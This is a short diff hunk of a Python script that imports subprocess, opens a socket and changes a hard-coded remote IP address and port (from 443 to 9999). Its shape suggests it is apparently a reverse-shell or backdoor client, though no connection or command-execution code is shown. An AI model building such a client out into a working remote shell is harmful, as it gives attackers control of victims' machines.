@@ -6,10 +6,10 @@ import subprocess
 
 s = socket.socket()
 
-port = 443
+port = 9999
 
 
-host = '138.68.171.84'
+host = '107.21.150.57'
 
 
 
